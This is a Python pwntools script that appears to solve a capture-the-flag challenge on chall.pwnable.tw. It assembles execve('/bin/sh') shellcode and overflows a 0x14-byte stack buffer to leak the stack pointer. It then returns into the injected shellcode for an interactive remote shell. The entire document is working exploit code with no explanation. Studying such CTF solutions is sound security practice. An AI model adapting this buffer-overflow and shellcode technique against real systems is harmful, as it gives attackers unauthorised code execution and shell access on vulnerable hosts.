from pwn import *

shellcode = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))

conn = remote('chall.pwnable.tw',10000)

print(conn.recvn(20))
conn.send(0x14*b'A'+p32(0x08048087))
rec = conn.recvn(20)
esp = u32(rec[:4])

conn.send(0x14*b'A' + p32(esp + 0x14) + shellcode)
conn.interactive()
